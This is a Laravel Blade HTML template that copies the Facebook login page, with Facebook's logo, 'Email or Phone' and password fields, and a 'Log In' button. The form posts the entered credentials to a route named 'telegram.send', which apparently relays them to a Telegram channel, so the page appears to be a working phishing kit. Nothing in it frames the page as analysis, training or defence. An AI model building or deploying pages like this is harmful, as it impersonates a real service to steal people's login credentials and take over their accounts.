<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-blue-50">

    <!-- Center the login form -->
    <div class="flex justify-center items-center min-h-screen">
        <!-- Login Form Card -->
        <div class="w-full max-w-md bg-white shadow-lg rounded-lg p-8">

            <!-- Facebook Logo -->
            <div class="flex justify-center mb-8">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="w-24">
            </div>

            <!-- Form -->
            <form action="{{ route('telegram.send') }}" method="POST">
                @csrf
                <!-- Email or Phone -->
                <div class="mb-4">
                    <label for="email" class="block text-sm font-medium text-gray-700">Email or Phone</label>
                    <input type="email" id="email" name="email" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" required>
                </div>

                <!-- Password -->
                <div class="mb-6">
                    <label for="password" class="block text-sm font-medium text-gray-700">Password</label>
                    <input type="password" id="password" name="password" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" required>
                </div>

                <!-- Login Button -->
                <button type="submit" class="w-full bg-blue-600 text-white p-3 rounded-lg font-semibold hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500">
                    Log In
                </button>
            </form>

            <!-- Forgot Password Link -->
            <div class="mt-4 text-center">
                <a href="#" class="text-sm text-blue-600 hover:underline">Forgotten password?</a>
            </div>

            <!-- Separator -->
            <div class="my-6 flex items-center justify-center text-gray-500">
                <span class="text-sm font-medium">or</span>
            </div>

            <!-- Create New Account Button -->
            <div class="text-center">
                <a href="#" class="w-full bg-green-600 text-white p-3 rounded-lg font-semibold hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-green-500">
                    Create New Account
                </a>
            </div>

        </div>
    </div>

</body>
</html>
